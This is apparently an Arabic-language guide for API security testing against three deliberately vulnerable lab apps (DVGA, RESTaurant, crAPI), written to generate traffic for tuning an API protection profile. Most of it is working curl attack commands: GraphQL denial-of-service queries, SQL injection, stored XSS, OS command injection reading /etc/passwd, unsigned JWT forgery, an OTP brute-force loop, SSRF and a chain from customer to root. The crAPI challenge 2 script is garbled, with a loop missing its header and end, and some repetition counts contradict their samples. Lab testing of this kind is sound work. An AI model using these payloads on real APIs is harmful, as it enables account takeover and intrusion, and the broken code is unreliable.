## نظرة عامة

يقوم هذا الدليل بفهرسة كل نقطة نهاية لواجهة برمجة التطبيقات، والثغرات الأمنية المقصودة، وحمولات الهجوم عبر تطبيقات اختبار أمان واجهات برمجة التطبيقات الثلاثة. استخدمه لبناء أنماط توليد حركة المرور لتطوير ملف حماية واجهات برمجة التطبيقات في F5 XC.

| التطبيق | البروتوكول | المسار | المنفذ | المصادقة | الثغرات الأمنية |
|---|---|---|---|---|---|
| **DVGA** | GraphQL | `/dvga/` | 80 | لا يوجد (مسؤول: admin/password) | 25 سيناريو |
| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (مُرمَّز بالنموذج) | 7 فئات من OWASP API 2023 |
| **crAPI** | REST (خدمات مصغرة) | `/` | 8888 | JWT (Bearer) | أكثر من 18 تحدي |

### متغيرات البيئة

```bash
ORIGIN="http://<ORIGIN_IP>"
CRAPI="http://<ORIGIN_IP>:8888"
```

## DVGA (تطبيق GraphQL المعرّض للثغرات)

**نقطة نهاية GraphQL:** `POST ${ORIGIN}/dvga/graphql`
**واجهة GraphiQL:** `GET ${ORIGIN}/dvga/`
**بيانات اعتماد المسؤول:** admin / password

تستخدم جميع تفاعلات DVGA نقطة نهاية واحدة (`/dvga/graphql`) مع طلبات POST تحتوي على حمولات JSON بصيغة `{"query":"..."}`.

### نظرة عامة على المخطط

```
Queries:  pastes, paste, me, systemHealth, systemUpdate, systemDiagnostics
Mutations: createPaste, importPaste, uploadPaste
Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
          OwnerObject (id, username, pastes)  ← circular reference
```

### مرجع نقاط النهاية

| العملية | النوع | المصادقة | الغرض |
|---|---|---|---|
| `pastes(public, filter, limit)` | Query | لا | قائمة اللصقات (حقن SQL عبر filter) |
| `paste(id)` | Query | لا | الحصول على لصقة واحدة |
| `me(token)` | Query | لا | الحصول على المستخدم عبر JWT (عرضة للتزوير) |
| `systemHealth` | Query | لا | فحص صحة النظام |
| `systemUpdate` | Query | لا | استعلام بطيء (~82 ثانية، ناقل لهجوم حجب الخدمة) |
| `systemDiagnostics(cmd)` | Query | admin/password | تنفيذ أوامر نظام التشغيل المسموح بها |
| `createPaste(title, content, public)` | Mutation | لا | إنشاء لصقة (XSS عبر content) |
| `importPaste(host, port, path, scheme)` | Mutation | لا | استيراد لصقة عن بُعد (SSRF، حقن أوامر) |
| `uploadPaste(filename, content)` | Mutation | لا | رفع لصقة (اجتياز المسار) |

### كتالوج الثغرات الأمنية

#### 1. حجب الخدمة (6 سيناريوهات)

**هجوم الاستعلامات المجمّعة:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
```

**التكرار العميق (مراجع دائرية بين Owner/Paste):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
```

**استعلام كثيف الموارد (استجابة ~82 ثانية):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemUpdate}"}'
```

**تكرار الحقول (تكرار الحقل أكثر من 500 مرة):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
```

**هجوم قائم على الأسماء المستعارة (1000 عملية مستعارة):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{q0:systemUpdate q1:systemUpdate q2:systemUpdate q3:systemUpdate q4:systemUpdate q5:systemUpdate q6:systemUpdate q7:systemUpdate q8:systemUpdate q9:systemUpdate}"}'
```

#### 2. كشف المعلومات (5 سيناريوهات)

**الاستقصاء (تعداد المخطط الكامل):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
```

**اقتراحات الحقول (الخطأ الإملائي يكشف الحقول الصالحة):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{titl}}"}'
```

**SSRF عبر importPaste (فحص الخدمات الداخلية):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:57575,path:\"/\",scheme:\"http\"){result}}"}'
```

#### 3. الحقن (4 سيناريوهات)

**حقن SQL عبر معامل filter:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes(filter:\"aaa\\u0027 OR 1=1--\"){id title content public}}"}'
```

**XSS مخزّن عبر createPaste:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss\",public:true){paste{id title}}}"}'
```

**حقن السجلات (انتحال اسم العملية):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation getPaste{createPaste(title:\"injected\",content:\"hidden mutation\",public:true){paste{id}}}"}'
```

#### 4. تنفيذ التعليمات البرمجية (3 سيناريوهات)

**حقن أوامر نظام التشغيل عبر importPaste:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
```

**أمر نظام التشغيل عبر systemDiagnostics (يتطلب مصادقة المسؤول):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemDiagnostics(cmd:\"id\")}"}'
```

#### 5. تجاوز التفويض (3 سيناريوهات)

**تزوير رمز JWT (يقبل الرموز غير الموقّعة):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
```

**كتابة ملف عشوائي عبر uploadPaste (اجتياز المسار):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{uploadPaste(filename:\"../../../tmp/test.txt\",content:\"path traversal test\"){result}}"}'
```

## واجهة RESTaurant API (مطعم معرّض للثغرات)

**واجهة Swagger:** `${ORIGIN}/restaurant/docs`
**مواصفات OpenAPI:** `${ORIGIN}/restaurant/openapi.json`
**المصادقة:** JWT عبر POST مُرمَّز بالنموذج إلى `/restaurant/token`
**الأدوار:** عميل (افتراضي)، موظف، شيف (مسؤول)

### الإعداد: التسجيل والمصادقة

```bash
# Register a test user
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123","first_name":"Test","last_name":"User","phone_number":"5551234567"}'

# Get JWT token (NOTE: form-encoded, not JSON)
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=Attack123" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Bearer token: ${TOKEN}"
```

### كتالوج الثغرات الأمنية

#### API1:2023 — تفويض معطل على مستوى الكائنات (BOLA)

**تعديل ملف مستخدم آخر:**
```bash
curl -X PUT ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
```

**الوصول لطلبات مستخدمين آخرين (تعداد الإزاحة):**
```bash
for i in 1 2 3 4 5; do
  curl -sf ${ORIGIN}/restaurant/orders/${i} \
    -H "Authorization: Bearer ${TOKEN}" 2>&1
  echo ""
done
```

#### API2:2023 — مصادقة معطلة

**هجوم القوة الغاشمة على سر JWT الضعيف (السر 6 أرقام: 97952):**
```bash
# Decode and forge tokens at jwt.io
# Secret: 97952 (brute-forceable with hashcat -a 3 -m 16500 token '?d?d?d?d?d?d')

# Forge a Chef token:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"chef","exp":9999999999}
# Sign with secret: 97952
```

#### API3:2023 — تفويض معطل على مستوى خصائص الكائنات (BOPLA)

**تعيين جماعي للدور من عميل إلى شيف:**
```bash
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

**مسار التصعيد: عميل → موظف → شيف:**
```bash
# Step 1: Escalate to Employee
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Employee"}'

# Step 2: Escalate to Chef
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

#### API5:2023 — تفويض معطل على مستوى الوظائف (BFLA)

**حذف عنصر من القائمة كعميل (يجب أن يتطلب دور موظف+):**
```bash
curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
  -H "Authorization: Bearer ${TOKEN}"
```

**تغيير دور مستخدم آخر:**
```bash
curl -X PUT ${ORIGIN}/restaurant/users/update_role \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","role":"Customer"}'
```

#### API7:2023 — تزوير الطلبات من جانب الخادم (SSRF)

**فحص نقاط النهاية الداخلية عبر image_url في القائمة (يتطلب دور موظف):**
```bash
# First escalate to Employee via BOPLA, then:
curl -X PUT ${ORIGIN}/restaurant/menu \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"SSRF Test","price":1.00,"category":"Test","image_url":"http://127.0.0.1:8091/admin/reset-chef-password"}'
```

#### API8:2023 — الحقن

**حقن أوامر نظام التشغيل عبر إحصائيات القرص (يتطلب دور شيف):**
```bash
# After escalating to Chef:
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
  -H "Authorization: Bearer ${TOKEN}"

curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
  -H "Authorization: Bearer ${TOKEN}"
```

### سلسلة الهجوم الكاملة: من عميل إلى جذر النظام

```bash
# 1. Register
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"Hack123","first_name":"H","last_name":"X","phone_number":"0"}'

# 2. Get token
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 3. Escalate to Chef (BOPLA)
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'

# 4. Re-authenticate to get Chef-level token
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 5. Command injection (RCE)
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
  -H "Authorization: Bearer ${TOKEN}"
```

## crAPI (واجهة برمجة التطبيقات السخيفة تماماً من OWASP)

**واجهة الويب:** `${CRAPI}/`
**MailHog:** `${CRAPI}/mailhog/` (التقاط البريد الإلكتروني للتحقق)
**المصادقة:** رمز JWT Bearer (RS256، عرضة لخلط الخوارزميات)
**البنية:** 7 خدمات مصغرة (identity, community, workshop, postgres, mongo, mailhog, web)

### الإعداد: التسجيل، التحقق من البريد الإلكتروني، تسجيل الدخول

```bash
# 1. Register
curl -X POST ${CRAPI}/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'

# 2. Check MailHog for verification email
# Browse to ${CRAPI}/mailhog/ or use MailHog API:
curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
import sys,json
msgs = json.load(sys.stdin)['items']
for m in msgs:
    print(f\"To: {m['Raw']['To'][0]}, Subject: {m['Content']['Headers']['Subject'][0]}\")
"

# 3. Login and get JWT token
TOKEN=$(curl -sf -X POST ${CRAPI}/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"tester@example.com","password":"TestPass123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

echo "Bearer token: ${TOKEN}"
```

### كتالوج التحديات

```bash
# Get your vehicle UUID first

#### التحدي 2 — BOLA: الوصول إلى تقارير الميكانيكي (بدون مصادقة)

# Sequential ID enumeration — no token needed

  echo "Report $i:"
  curl -sf "${CRAPI}/workshop/api/mechanic/mechanic_report?report_id=${i}"

```

#### التحدي 3 — مصادقة معطلة: هجوم القوة الغاشمة على OTP إعادة تعيين كلمة المرور

```bash
# Request OTP for victim
curl -X POST ${CRAPI}/identity/api/auth/forget-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# Brute-force 4-digit OTP (v2 has NO rate limiting)
for otp in $(seq -w 0000 9999); do
  RESULT=$(curl -sf -X POST ${CRAPI}/identity/api/auth/v2/check-otp \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"otp\":\"${otp}\"}" 2>&1)
  echo "$otp: $RESULT" | grep -v "Invalid OTP" && break
done
```

#### التحدي 15 — خلط خوارزميات JWT

```bash
# Forge a JWT with algorithm "none" (no signature verification):
# 1. Set header: {"alg":"none","typ":"JWT"} and base64url-encode it
# 2. Set payload: {"email":"admin@example.com","role":"admin"} and base64url-encode it
# 3. Join with dots, leave signature empty: <header>.<payload>.
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="${HEADER}.${PAYLOAD}."

curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
  -H "Authorization: Bearer ${FORGED}"
```

## أنماط توليد حركة المرور

### المرحلة 1: خط الأساس (المسار الطبيعي)

قم بتوليد حركة مرور مشروعة لتأسيس سلوك واجهة برمجة التطبيقات الطبيعي قبل اختبار أنماط الهجوم.

**خط أساس DVGA:**
```bash
# Normal queries
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"{pastes{id title}}"}'
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"mutation{createPaste(title:\"note\",content:\"hello\",public:true){paste{id}}}"}'
```

**خط أساس RESTaurant:**
```bash
curl -sf ${ORIGIN}/restaurant/menu -H "Authorization: Bearer ${TOKEN}"
curl -sf ${ORIGIN}/restaurant/profile -H "Authorization: Bearer ${TOKEN}"
curl -X POST ${ORIGIN}/restaurant/orders -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -d '{"menu_item_id":1,"quantity":1}'
```

**خط أساس crAPI:**
```bash
curl -sf ${CRAPI}/identity/api/v2/user/dashboard -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/workshop/api/shop/products -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${TOKEN}"
```

### المرحلة 2: حركة مرور الهجوم حسب فئة OWASP

**اختبار BOLA:** تعداد المعرفات التسلسلية، تبديل معرفات المستخدمين في الطلبات، الوصول إلى الموارد بدون ملكية.

**اختبار الحقن:** حمولات SQL في معاملات filter/coupon، حقن استعلامات GraphQL، حقن أوامر نظام التشغيل عبر حقول المعاملات.

**اختبار تجاوز المصادقة:** تزوير رموز JWT، هجوم القوة الغاشمة على OTP، استخدام إصدارات واجهة برمجة التطبيقات المهملة، خلط الخوارزميات.

**اختبار SSRF:** عناوين URL داخلية في معاملات `importPaste` و`image_url` و`mechanic_api`.

**اختبار حجب الخدمة:** هجمات التجميع/التكرار/الأسماء المستعارة في GraphQL، `repeat_request_if_failed` بأعداد عالية.

### المرحلة 3: سلاسل الهجوم متعددة الحالات

تتطلب بعض الهجمات تسلسلات متعددة الخطوات مع حالة:

1. **سلسلة تصعيد RESTaurant:** تسجيل → رمز → PATCH للدور إلى شيف → إعادة المصادقة → حقن الأوامر
2. **التدفق الكامل لـ crAPI:** التسجيل → التحقق من البريد الإلكتروني (MailHog) → تسجيل الدخول → إضافة مركبة → الاتصال بالميكانيكي (SSRF) → التلاعب بالطلبات
3. **من الاستطلاع إلى الاستغلال في DVGA:** الاستقصاء → اكتشاف systemDiagnostics → هجوم القوة الغاشمة على بيانات اعتماد المسؤول → تنفيذ أوامر نظام التشغيل
